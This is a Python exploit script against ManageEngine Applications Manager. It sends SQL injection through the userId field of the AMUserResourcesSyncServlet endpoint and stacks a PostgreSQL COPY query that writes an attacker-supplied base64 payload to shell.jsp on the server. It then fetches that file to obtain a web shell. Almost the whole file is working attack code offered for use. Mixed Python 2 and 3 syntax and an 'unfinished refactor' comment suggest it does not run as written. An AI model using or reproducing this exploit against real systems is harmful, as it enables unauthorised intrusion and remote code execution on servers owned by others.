#!/usr/bin/python3

## _finish_pyth3_refactor__
##
##################################
##################################
import sys
import requests
import urllib3
import time
 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
 
def main():
    if len(sys.argv) != 2:
        print "(+) usage %s <target>" % sys.argv[0]
        print "(+) eg: %s target" % sys.argv[0]
        sys.exit(1)
    t = sys.argv[1]
    encoded_payload = sys.stdin.readlines()
 
    burp0_url = "https://%s:8443/servlet/AMUserResourcesSyncServlet" % t
    burp0_headers = {"Connection": "close", "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "User-Agent": "python-requests/2.18.4", "Content-Type": "application/x-www-form-urlencoded"}
    burp0_data={"ForMasRange": "1", "userId": "1;copy (select convert_from(decode($$%s$$,$$base64$$),$$utf-8$$)) to $$C:\\\\Program Files (x86)\\\\ManageEngine\\\\AppManager12\\\\working\\\\shell.jsp$$;-- " % encoded_payload[0]}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxies, verify=False)
 
    print r.text
    print r.headers
    print ""
    time.sleep(3)
    print "[*] Getting Shell Now...."
    shell_url = "http://%s/shell.jsp" % t
    r2 = requests.get(shell_url, verify=False)
    print r2.text
    print r2.headers
 
if __name__ == '__main__':
    main()
   
####################################
##
##
